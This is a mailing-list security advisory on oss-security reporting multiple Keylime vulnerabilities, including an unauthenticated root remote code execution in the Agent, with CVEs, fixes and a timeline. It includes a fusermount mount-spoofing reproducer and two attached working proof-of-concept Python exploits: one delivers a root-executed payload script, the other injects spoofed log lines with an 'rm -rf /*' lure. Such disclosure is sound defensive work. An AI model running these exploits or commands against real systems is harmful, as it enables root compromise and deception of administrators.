X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["29568" "Friday" "28" "January" "2022" "13:57:23" "+0100" "Matthias Gerstner" "mgerstner@suse.de" nil "783" "[oss-security] keylime: Multiple Security Issues (including remote code execution in the Agent component)" nil nil nil "1" nil nil (number mark "U       mgerstner@su Jan 28  783/29568 " thread-indent "\"[oss-security] keylime: Multiple Security Issues (including remote code execution in the Agent component)\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] keylime: Multiple Security Issues (including remote code execution in the Agent component)" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 12009 invoked by uid 550); 28 Jan 2022 12:57:37 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 11979 invoked from network); 28 Jan 2022 12:57:36 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
	t=1643374644; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type;
	bh=9OIiY72gVRH1X8uGjrd5s9sQ3V4C34Dmicu1HcNuFkc=;
	b=TFhXs/0f4YMu031B942vFkn5lIo1dWEaFAwpvgYzs8EpZw+R58MTp/lw5aT4Z/Ho/T4h6A
	rJoAhbP42tjVzwFr0Nch0B9gu+nsj4OyiTutJ2tbCSR3CG0jHwm9Kd3pN3Z28pS0zVn1AP
	SFZCOo28lKmoB07OaWEzXGCl/ZzZQJw=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
	s=susede2_ed25519; t=1643374644;
	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type;
	bh=9OIiY72gVRH1X8uGjrd5s9sQ3V4C34Dmicu1HcNuFkc=;
	b=ReonqpsrKLZpLp45TCyMTynODyXoLpBCAu8fQaTyBlQg2de5vN88EyFk+xnLN3JT1BuHlc
	Mt7iZp5rBkiAHRCQ==
Date: Fri, 28 Jan 2022 13:57:23 +0100
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Message-ID: <YfPoM0oE2j22rJZW@f195.suse.de>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
	protocol="application/pgp-signature"; boundary="GiLVm/XjB5OuUY8G"
Content-Disposition: inline
Subject: [oss-security] keylime: Multiple Security Issues (including remote code execution
 in the Agent component)

--GiLVm/XjB5OuUY8G
Content-Type: multipart/mixed; boundary="csXhdcC7ysuLed7I"
Content-Disposition: inline


--csXhdcC7ysuLed7I
Content-Type: text/plain; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

Hello list,

I have been reviewing the Keylime TPM remote attestation solution [1]
which resulted in a number of security related findings, including an
arbitrary remote code execution in the Keylime Agent component. The
upstream project published security advisories, fixes and an update
strategy to Keylime version 6.3.X today. Please find the details in the
following full report:

1) Scope of Review
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

I've been looking into the four main components of Keylime: the Agent,
Registrar, Verifier and Tenant applications. I have been looking into
version 6.2.0. Any source code locations mentioned in this report relate
to this version.

2) Findings in the Agent Component
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D

a) `check_mounted()` Function Logic can be Fooled by Unprivileged Mounts (C=
VE-2022-23948)
---------------------------------------------------------------------------=
--------------

The `check_mounted()` function in `secure_mount.py` attempts to make
sure that a "secure" tmpfs is mounted at `/var/lib/keylime/secure` to
store sensitive data on that never gets written to disk. To do so the
function parses the output of the `mount` utility to determine whether
this file system is already mounted at the desired location.

There can exist the possibility of unprivileged users performing certain
mount operations, one of the most prominent examples being the
`fusermount` setuid-root binary for mounting FUSE file systems. In view
of this, parsing mount table output needs prudence. I described the
basic issue previously already in another report [2].

The following is a reproducer using `fusermount` that shows the basic local
attack vector:

    user$ export _FUSE_COMMFD=3D0
    user$ fusermount some/path/ -ononempty,fsname=3D"tmpfs on /var/lib/keyl=
ime/secure"

This will fool the parsing logic in `check_mounted()` and thus the
function assumes that the "secure" tmpfs is already mounted, while it
actually isn't.  Thus this will allow a local attacker on the system to
prevent this security feature to be effective, *if* the local attacker
manages to create such a mount entry before the `keylime_agent` is
starting up.

The attack vector can also be used to perform a local DoS against
`keylime_agent` by claiming a different `fsname` than tmpfs.
`check_mounted()` will throw an Exception in this case and the Agent
won't start.

On a side note there are calls to `secure_mount.mount()` spread
throughout the Keylime codebase (for example three times in
`keylime_agent.py`, two times in `tpm_main.py` and two times in
`ca_impl_cfssl.py`. There is no code to *clean up* this mount again,
however. So it potentially leaves behind a stale mount after services
are shutdown. Furthermore, if multiple Keylime processes should operate
in parallel this could result in a race condition where the "secure"
tmpfs is mounted twice, in the worst case mounting a fresh tmpfs over
previously stored content there.

My recommendation is to parse the `/proc/self/mountinfo` pseudo file for
mount table information instead. Whitespace is specially encoded in this
file. Furthermore the responsibility of mounting and unmounting this
file system should be more clearly defined during startup/shutdown of
processes and maybe a reference counting / locking scheme to prevent
race conditions should be used.

### Upstream Security Advisory

https://github.com/keylime/keylime/security/advisories/GHSA-wj36-qcfg-5j52

### Upstream Fixes

https://github.com/keylime/keylime/commit/1a4f31a6368d651222683c9debe7d6832=
db6f607
https://github.com/keylime/keylime/commit/d37c406e69cb6689baa2fb7964bad7520=
9703724

b) Possible Information Leaks via Unauthenticated Agent Quote Interface
-----------------------------------------------------------------------

A TPM quote can be requested without authentication from the Agent service =
via
the network:

    $ curl "keyagent-host:9002/?api_version=3D500&quotes=3Dmyquote&nonce=3D=
mynonce"
    {
        "code": 200,
        "status": "Success",
        "results": {
            "quote": <base64-data>, "hash_alg": "sha256", "enc_alg": "rsa",=
 "sign_alg": "rsassa",
            "pubkey": <PEM key>", "boottime": 1639999864
        }
    }

This exposes for example the *boottime* of the host where the Agent is
running, information that is not otherwise easily publicly available.
Furthermore: Could the contents of the TPM quote data also be
interesting data? Could it for example allow deductions about which kind
of operating system kernel is running on the host?

I recommend to somehow authenticate and cryptographically secure this
Agent interface to prevent information leaks of this kind.

### Upstream Fixes

This issue did not receive a dedicated CVE and fix. It is covered
together with the following issue 2.c).

c) Arbitrary Remote Code Execution in the Agent via Unauthenticated Bootstr=
ap Interface (CVE-2021-43310)
---------------------------------------------------------------------------=
-----------------------------

Note that this issue has been discovered in parallel also by Thore
Sommer, a Keylime upstream developer.

It looks like it is possible to simply post arbitrary new values for the
U and V key parts and provide a new configuration payload to the Agent,
only knowing the Agent's UUID. The Agent's UUID can be public or
semi-public information like when `agent_uuid=3Dhostname` is configured.
=46rom the Keylime paper [3] (section 3.2.2) it sounds like the UUID HMAC
check is not considered a security feature but only a sanity check:

> This provides the node with a quick check to determine if Kb is correct.

When `extract_payload_script=3Dtrue` (default) and
`payload_script=3Dautorun.sh` (default) are configured in `keylime.conf`
then the provided payload will be unzipped and a potentially contained
`autorun.sh` script is executed with full root privileges. Attached you
can find a reproducer script `post_key.py` that demonstrates the issue
by creating a file `/tmp/evil` on the Agent host by only providing the
Agent hostname and UUID as input parameters.

Even if `payload_script` is disabled then the extraction of a ZIP file
as _root_ might result in a remote root exploit by extracting files
outside of the intended target directory. I did not test this variant of
the attack vector, though. Furthermore by providing a ZIP bomb as
payload the Agent process can be subjected to a remote DoS through
memory exhaustion.

Retrieving the full symmetric key previously stored in
`/var/lib/keylime/secure/derived_tci_key` should not be possible this
way, because when performing the bootstrap protocol, the previous data
is removed in `keylime_agent.py:242`. A skillful attacker might attempt
to first compromise the Agent node and then wait for the Tenant to
re-deploy the Agent using authentic keys and payload. Should this
succeed then the attacker can obtain the secret symmetric key from the
compromised Agent node after all.

Similar to issue b) I recommend to somehow authenticate and
cryptographically secure this Agent interface to prevent these attacks.
As a hotfix disabling the relevant configuration features should at
least prevent the remote code execution and memory exhaustion attack
vectors. Setting non-predictable UUID values can also help (but one
should also consider item 3.a in this context).  Even then this
interface still allows to disrupt the operational state of the Agent
host by simply overwriting its current configuration.

### Upstream Security Advisory

https://github.com/keylime/keylime/security/advisories/GHSA-2m39-75g9-ff5r

### Upstream Fixes

The fix consists of a larger number of upstream commits regarding
introduction of "mTLS" for the Agent interface. This means the
connection towards the Agent will in the future be cryptographically
secured and thus only trusted actors can use the Agent interface.

The upgrade path is a bit complicated because of this (see upstream
advisory).  Upstream version 6.3.X will introduce the new mTLS support
but not enforce it, to allow upgrading of all Keylime components on all
nodes. Only upstream version 6.4.x will enforce the new protocol.

d) Key Exchange and Bootstrap Protocol Susceptible to Replay Attacks
--------------------------------------------------------------------

Authentic payloads being passed from the Tenant to the Agent should be
reasonably safe from attackers (when not considering issue c)), since
the two halves of the symmetric key are encrypted using the per-agent
node RSA public key. The bootstrap protocol seems to be susceptible to
certain replay attacks, however. Since the interface does not employ
transport security, the bootstrap protocol can simply be recorded and
replayed to activate an authentic configuration payload. This could e.g.
be used by an attacker to activate an outdated or even insecure older
configuration of the Agent node.

### Upstream Fixes

This issue did not receive a dedicated CVE and fix. It is covered
together with the previous issue 2.c).

3) Findings in the Registrar Component
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

a) UUID of Agents is Received on Unprotected HTTP Interface
-----------------------------------------------------------

The Registrar provides two separate HTTP interfaces, a TLS protected one
and an unprotected one. Part of the unprotected interface is the Agent
registration.  As part of the Agent registration the Agent UUID is
passed unencrypted (processed in `registrar_common.py:229`).

This is not a security issue in its own but relates to issue 2.c where
the knowledge of the UUID facilitates remote code execution on the Agent
nodes.  This means if an attacker can listen in on the Registrar's Agent
registration communication then even unpredictable Agent UUIDs no longer
hinder the attack described in issue 2.c).

As outlined in 2.c) the UUID does not seem to have been thought of as a
security property in the first place so I see no urge to change anything
here. Although when the bootstrap protocol should get TLS protection
then for completeness it could also make sense to protect this Registrar
interface as well the same way.

### Upstream Fixes

This specific aspect is covered by the following commit:

https://github.com/keylime/keylime/commit/e5f033c66403a899685b81a3af03cd59f=
76e455f

There is no dedicated CVE but it is covered together with the
overarching introduction of mTLS as outlined in issue 2.c).

b) Unsanitized UUID passed on Unprotected HTTP Interface Facilitates Log Sp=
oofing (CVE-2022-23949)
---------------------------------------------------------------------------=
-----------------------

Since the Registrar's unprotected HTTP interface requires no
authentication, anybody can post arbitrary Agent registrations with
arbitrary parameters. The Agent ID (UUID) parameter is not sanitized in
any way and is used unfiltered in log messages (e.g.
`registrar_common.py:107`).

As a result the Agent ID parameter can be used to inject seemingly valid
additional log lines that appear e.g. in `journalctl -u
keylime_registrar.service`. The attached reproducer script
`post_agent.py` can be used to demonstrate this:

    $ ./post_agent.py --host registrar-host --log-line "Please run rm -rf /=
* to protect your system"

In the journal we will then see:

    Dec 21 11:44:22 registrar-host keylime_registrar[1426]: 2021-12-21 11:4=
4:22.281 - keylime.registrar - WARNING - POST for trusted-agent
    Dec 21 11:44:22 registrar-host keylime_registrar[1426]: 2021-12-21 11:4=
4:22.931 - keylime.registrar - WARNING - Please run rm -rf /* to protect yo=
ur system
    Dec 21 11:44:22 registrar-host keylime_registrar[1426]: 2021-12-21 11:4=
4:22.940 - keylime.registrar - DEBUG - returning 400 response. [...]

Such log spoofing could be used to entice Administrators to perform
actions that can be harmful or otherwise in the interest of an attacker.

My recommendation is on the one hand to diligently sanitize untrusted
input parameters. On the other hand it might make sense to authenticate
this currently untrusted interface.

### Upstream Advisory

https://github.com/keylime/keylime/security/advisories/GHSA-87gh-qc28-j9mm

### Upstream Fixes

The UUID sanitazion is introduced via these commits:

https://github.com/keylime/keylime/commit/387e320dc22c89f4f47c68cb37eb9eec2=
137f34b
https://github.com/keylime/keylime/commit/e429e95329fc60608713ddfb82f4a92ee=
3b3d2d9
https://github.com/keylime/keylime/commit/65c2b737129b5837f4a03660aeb1191ce=
d275a57

Otherwise the introduction of mTLS as outlined in issues 3.a) and 2.c)
further protect this.

4) Findings in the Verifier Component
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

a) Revocation Notifier Uses Fixed /tmp Path for UNIX Domain Socket (CVE-202=
2-23950)
---------------------------------------------------------------------------=
--------

In *revocation_notifier.py* a fixed path in the world writable location
*/tmp/keylime.verifier.ipc* is used. The code (in this case the third
party `zeromq` Python module) forcefully removes any file object found
there earlier.  Should the program be running as non-root, or if another
local user simply places a *directory* at this location, then this
serves as a local DoS attack against the revocation notifier process,
because the socket cannot be created.

This situation doesn't even seem to be noticed by the Verifier main
process, because the child process `broker_proc` is never waited on.
This means that the local attacker could even replace the "blocking"
directory by his own UNIX domain socket later on and will then receive
revocation events from invocations of the `notify()` function in the
main Verifier process.  The full impact of this would have to be
researched further. It looks like failed quote notifications would
longer be sent out.

I recommend to place UNIX domains sockets in a dedicated safe directory
in /run that cannot be staged with attacks by other local users in the
system.

### Upstream Advisory

https://github.com/keylime/keylime/security/advisories/GHSA-9r9r-f8xc-m875

### Upstream Fixes

This fix places the socket into a private /run/keylime directory:

https://github.com/keylime/keylime/commit/ea5d0373fa2c050d5d95404eb779be7e8=
327b911

b) Get Quote Response Contains Possibly Untrusted ZIP Data (CVE-2022-23951)
---------------------------------------------------------------------------

The Verifier process periodically performs quote operations on
registered Agents. As part of this `process_quote_response()` is called
and furthermore `check_quote()` and finally `_tpm2_checkquote()`. In
`tpm_main.py:1018` a couple of ZIP data streams are uncompressed via
`zlib.decompress()`.

Since this is processing possibly untrusted data - the Verifier is
attempting to verify the current trust status of the node after all - it
needs to be assumed that malicous data can also be supplied here.

Therefore the question arises whether `zlib.decompress()` is robust
against processing invalid ZIP data streams. One thing I already found
out is that it is not robust against delivering ZIP bombs that will
cause a memory exhaustion in the Verifier process.

This finding also is valid similarly for all other Keylime interface
that process ZIP data, like in the Agent.

### Upstream Advisory

https://github.com/keylime/keylime/security/advisories/GHSA-6xx7-m45w-76m2

### Upstream Fixes

This fix simply removes the ZIP compression from the Verifier interface:

https://github.com/keylime/keylime/commit/6e44758b64b0ee13564fc46e807f4ba98=
091c355

5) General Findings
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

This section contains findings that apply to all keylime components
alike.

a) World-Readable keylime.conf Contains Potentially Sensitive Data (CVE-202=
2-23952)
---------------------------------------------------------------------------=
--------

The configuration `/etc/keylime.conf` is installed world-readable:

    $ ls -l /etc/keylime.conf
    -rw-r--r-- 1 root root 26770 Dec 16 14:54 /etc/keylime.conf

This is the case for installations performed manually via the provided
`installer.sh` script as well as for the RPM packaging found in both
openSUSE Tumbleweed and Fedora 35 Linux distributions. Further
distributions might be affected.

`keylime.conf` contains a lot of information, some of it sensitive like
the TPM ownership password (`tpm_ownerpassword`), TLS certificate
private key passwords (`private_key_pw`, `registrar_private_key_pw`) or
the database password for the Registrar (`database_password`). Thus this
is a local information leak, because arbitrary local users can obtain
these passwords from the configuration file.

My recommendation is to make this file only accessible to _root_ and
adjust all installation routines and possibly documentation. The Keylime
code could perform a sanity check of the permissions of the
configuration file before reading it in.

### Upstream Advisory

https://github.com/keylime/keylime/security/advisories/GHSA-fchm-5w2v-qfm8

### Upstream Fixes

The following fix explicitly sets the permissions for the configuration
file in the installer:

https://github.com/keylime/keylime/commit/883085d6a4bcea3012729014d5b8e15ec=
d65fc7c

b) Lack of Privilege Separation
-------------------------------

All keylime services are currently designed to run as root all the time
(except for testing purposes, see `REQUIRE_ROOT` in `config.py`). Only
few bits of the keylime components actually should need root privileges.
Most notably the bootstrapping scripts in the Agent component or the
ability to bind privileged ports.

Implementing a privilege separation approach would increase the defense
in depth for keylime considerably, avoiding smaller security issues to
become severe fast.

### Upstream Statement

Keylime upstream states that it is already possible to run Keylime as
non-root. The `REQUIRE_ROOT` bits are not strictly necessary any more
and can be removed from the code. The Debian packaging already makes use
of the privilege separation.

6) Timeline
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

2021-12-09: I started the review on the code
2021-12-23: I contacted the upstream security contact and upstream
	    developer Thore Sommer privately by email and provided them
	    the report results, offering coordinates disclosure.
2022-01-04: Upstream confirmed most of my findings and work on the fixes
	    began. Alberto Planas, a SUSE colleague and maintainer of
	    the SUSE Keylime packaging also contributed some fixes.
2022-01-28: Publication of the security advisories and fixes by upstream
	    took place. Upstream also discovered some further security
	    issues themselves in the meanwhile.

[1]: https://github.com/keylime/keylime
[2]: https://www.openwall.com/lists/oss-security/2020/06/04/5
[3]: https://www.ll.mit.edu/sites/default/files/publication/doc/2018-04/201=
6_12_07_SchearN_ACSAC_FP.pdf

Cheers

Matthias

--=20
Matthias Gerstner <matthias.gerstner@suse.de>
Security Engineer
https://www.suse.com/security
GPG Key ID: 0x14C405C971923553
=20
SUSE Software Solutions Germany GmbH
HRB 36809, AG N=FCrnberg
Gesch=E4ftsf=FChrer: Ivo Totev

--csXhdcC7ysuLed7I
Content-Type: text/x-python; charset=us-ascii
Content-Disposition: attachment; filename="post_agent.py"
Content-Transfer-Encoding: quoted-printable

#!/usr/bin/python3
#
# Author: Matthias Gerstner
#
# All of this source code is licensed under:
#
# ISC License
#
# Copyright (c) 2021, SUSE LLC
#
# Permission to use, copy, modify, and/or distribute this software for any
# purpose with or without fee is hereby granted, provided that the above
# copyright notice and this permission notice appear in all copies.
#
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
# ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
# ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
# OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.

import argparse
import base64
import datetime
import json
import pprint
import sys
import urllib.request
from urllib.request import urlopen

from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, mod=
es)
from cryptography.hazmat.backends import default_backend
import cryptography.hazmat.primitives.asymmetric.padding

cliparser =3D argparse.ArgumentParser()
cliparser.add_argument("--host", type=3Dstr, help=3D"hostname where to reac=
h the keylime_agent web server", required=3DTrue)
cliparser.add_argument("-p", "--port", type=3Dint, default=3D8890, help=3D"=
Port where to contact the keylime_agent web server on --host")
cliparser.add_argument("--log-line", help=3D"Log line to inject in registra=
r service", default=3DNone)
cliparser.add_argument("--agent-id", help=3D"agent UUID to register", defau=
lt=3DNone)
cliargs =3D cliparser.parse_args()

if not cliargs.log_line and not cliargs.agent_id:
    print("Pass --log-line or --agent-id", file=3Dsys.stderr)
    sys.exit(1)
elif cliargs.log_line and cliargs.agent_id:
    print("Only pass one: --log-line or --agent-id", file=3Dsys.stderr)
    sys.exit(1)

AGENT_URI =3D f"http://{cliargs.host}:{cliargs.port}"
API_VERSION =3D 500

def getURI(pars):
    ret =3D f"{AGENT_URI}/?api_version=3D{API_VERSION}"

    for k, v in pars.items():
        k =3D urllib.parse.quote(k)
        v =3D urllib.parse.quote(v)
        ret +=3D f"&{k}=3D{v}"

    return ret

def postJSON(uri, _json):
    print("POST", uri)
    print(_json)
    try:
        rq =3D urllib.request.Request(uri, _json.encode(), method=3D'POST')
        r =3D urlopen(rq)
        res =3D r.read()
    except Exception as e:
        print(f"POST failed: {e}")
        return
    res =3D json.loads(res)
    if res["code"] !=3D 200:
        print("POST failed: {}".format(str(res)))
        return
    print("POST succeeded:\n")
    pprint.pprint(res)

if cliargs.log_line:
    now =3D datetime.datetime.now()
    ts =3D now.strftime("%Y-%m-%d %H:%M:%S")
    agent_id =3D "trusted-agent"
    agent_id +=3D f"\n{ts}.931 - keylime.registrar - WARNING - {cliargs.log=
_line}"
    agent_id +=3D f"\n{ts}.940 - keylime.registrar - DEBUG -"
else:
    agent_id =3D cliargs.agent_id

uri =3D getURI({"agents": agent_id})

#ekcert =3D b"ekcert"
aik_tpm =3D b"aikt\x00\x04\x00\x05\x00\x72"
#ek_tpm =3D b"ek_tpmandmorestuff"

#ek_tpm =3D base64.b64decode(open("mc-s", 'rb').read())
ek_tpm =3D open("mc-e", 'rb').read()

json_post =3D f'''{{
    "ekcert": "emulator",
    "aik_tpm": "{base64.b64encode(aik_tpm).decode()}",
    "ek_tpm": "{base64.b64encode(ek_tpm).decode()}",
    "ip": "127.0.0.2",
    "auth_tag": "stuff"
}}'''

postJSON(uri, json_post)

--csXhdcC7ysuLed7I
Content-Type: text/x-python; charset=us-ascii
Content-Disposition: attachment; filename="post_key.py"
Content-Transfer-Encoding: quoted-printable

#!/usr/bin/python3
#
# Author: Matthias Gerstner
#
# All of this source code is licensed under:
#
# ISC License
#
# Copyright (c) 2021, SUSE LLC
#
# Permission to use, copy, modify, and/or distribute this software for any
# purpose with or without fee is hereby granted, provided that the above
# copyright notice and this permission notice appear in all copies.
#
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
# ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
# ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
# OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.

import argparse
import base64
import hashlib
import hmac
import json
import sys
from urllib.request import urlopen

from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, mod=
es)
from cryptography.hazmat.backends import default_backend
import cryptography.hazmat.primitives.asymmetric.padding

cliparser =3D argparse.ArgumentParser()
cliparser.add_argument("--uuid", type=3Dstr, help=3D"UUID of the target Age=
nt", required=3DTrue)
cliparser.add_argument("--host", type=3Dstr, help=3D"hostname where to reac=
h the keylime_agent web server", required=3DTrue)
cliparser.add_argument("-p", "--port", type=3Dint, default=3D9002, help=3D"=
Port where to contact the keylime_agent web server on --host")
cliargs =3D cliparser.parse_args()


AGENT_URI =3D f"http://{cliargs.host}:{cliargs.port}"
API_VERSION =3D 500


def getURI(pars):
    ret =3D f"{AGENT_URI}/?api_version=3D{API_VERSION}"

    for k, v in pars.items():
        ret +=3D f"&{k}=3D{v}"

    return ret

def strbitxor(a, b):
    a =3D bytearray(a)
    b =3D bytearray(b)
    retval =3D bytearray(len(b))
    for i, _ in enumerate(a):
        retval[i] =3D a[i] ^ b[i]
    return bytes(retval)

def postJSON(uri, _json):
    print("POST", uri)
    print(_json)
    r =3D urlopen(uri, _json.encode())
    res =3D r.read()
    res =3D json.loads(res)
    if res["code"] !=3D 200:
        raise Exception("POST failed: {}".format(str(res)))
    print("POST succeeded")

def createZipPayload(script):
    import zipfile
    from io import BytesIO

    memfile =3D BytesIO()
    with zipfile.ZipFile(memfile, 'w') as zf:
        # autorun.sh is the default filename for a script to be immediately
        # executed
        zf.writestr("autorun.sh", script)

    return memfile.getvalue()

def encryptPayload(payload, key):
    # this is based on keylime/crypto.py
    AES_BLOCK_SIZE =3D 16
    # "random" IV
    iv =3D AES_BLOCK_SIZE * 'a'
    iv =3D iv.encode()
    encryptor =3D Cipher(algorithms.AES(key), modes.GCM(iv), backend=3Ddefa=
ult_backend()).encryptor()
    cipher_text =3D encryptor.update(payload) + encryptor.finalize()
    return iv + cipher_text + encryptor.tag

# first retrieve the agent's public key which is used for encryption of the
# two U and V key parts in the later POST request
r =3D urlopen(getURI({"keys": "pubkey"}))
json_res =3D r.read().decode('utf8')
res =3D json.loads(json_res)
res =3D res.get("results", {})
pubkey =3D res.get("pubkey", None)

if not pubkey:
    print("Failed to get public key. JSON:", json_res)
    sys.exit(1)

pubkey =3D serialization.load_pem_public_key(pubkey.encode())

# it's more or less irrelevant which kind of key we offer here, when we send
# the same data for the U and V parts then the XOR of both will result in z=
ero
# bytes
# we need 256 bits to act as a key for AES-GCM
plain_key =3D b"abcdefgh" * 4

# encrypt the plain key using the RSA public key of the agent
enc_key =3D pubkey.encrypt(
    plain_key,
    cryptography.hazmat.primitives.asymmetric.padding.OAEP(
        mgf=3Dcryptography.hazmat.primitives.asymmetric.padding.MGF1(algori=
thm=3Dhashes.SHA1()),
        algorithm=3Dhashes.SHA1(),
        label=3DNone
    )
)

# this will be the complete derived key that the agent calculates from the U
# and V parts
derived_key =3D strbitxor(plain_key, plain_key)
print("DERIVED:", derived_key)

# the auth_tag needs to match the HMAC of the agent's UUID based on the
# derived_key
h =3D hmac.new(derived_key, msg=3DNone, digestmod=3Dhashlib.sha384)
h.update(cliargs.uuid.encode('utf8'))
hx =3D h.hexdigest()

print("UUID HMAC:", hx)

script =3D """#!/bin/bash
touch /tmp/evil
"""

zipfile =3D createZipPayload(script)
payload =3D encryptPayload(zipfile, derived_key)

json_post =3D f'''{{
    "encrypted_key": "{base64.b64encode(enc_key).decode()}",
    "auth_tag": "{hx}",
    "payload": "{base64.b64encode(payload).decode()}"
}}'''

# feed both key parts to the agent
for key_type in ("ukey", "vkey"):
    uri =3D getURI({"keys": key_type})
    postJSON(uri, json_post)

print("If all worked out then the agent host should now have a /tmp/evil fi=
le")

--csXhdcC7ysuLed7I--

--GiLVm/XjB5OuUY8G
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAABCAAdFiEE82oG1A8ab1eESZdjFMQFyXGSNVMFAmHz6DMACgkQFMQFyXGS
NVNd3BAAg8IqEV6AjA1+XEwBRH9DSRmGiAvxM8qUIKBh+0opkGtc19UKxuqYBDbi
WVkWKEZg5QB55FGtbA508SDugI5jj0ZPTnAB/MLoPNSp4SjkFbV4sS+wIEzAScvO
bKmH3qDLoUHvR/NsJA2MyHAJzFEjTk3z/jXvGZ05Hq4UOoz+7ZgNqoRs3zoGXG29
O6HW9lmJDS1RHOg+/yvXSHFCWld+RqGdWKEP6fWHwvtb1jOGV6/XhZR+NVYC4M5M
6KnM6trblqt9EvjhRMB5roWyyOen4ruOV7j4yTz1/FafaXqqpfSDrYwApOD7/rcB
arUSPhK577IzDcXnSQ24en/NW/Qk22zA57/dnKLYyJL3XcjE42+K/dMFfZqXKKPj
ftPU1EzMgo+EpU8VRCvh9Twgxq3CQZdsZILhdhm2ihIc9hJrO2wx4Lqa4YXwdDEf
dsyJ3M2MVjXGTzepWABzwM29CgipV0s2YRNjY6n50ypJIVgC5G22JXlup4aJuTxm
PphC7MwlUOhNWUvBzrLpkEjr9gv2mNRO2CrW7V4pRradV5FdxorE4MMePgB8GlXO
AndL2UTnX/nfJOu4xNd5BOn1cPPn6Zm+dGOW2ZlQg9sW2MLnn05ChkBPKukkOfRj
f8zZ65YzJEUBLDsPmFkdLR1BlN+RVg5oU5CVYJKF1cD2emtkjOI=
=lKj6
-----END PGP SIGNATURE-----

--GiLVm/XjB5OuUY8G--
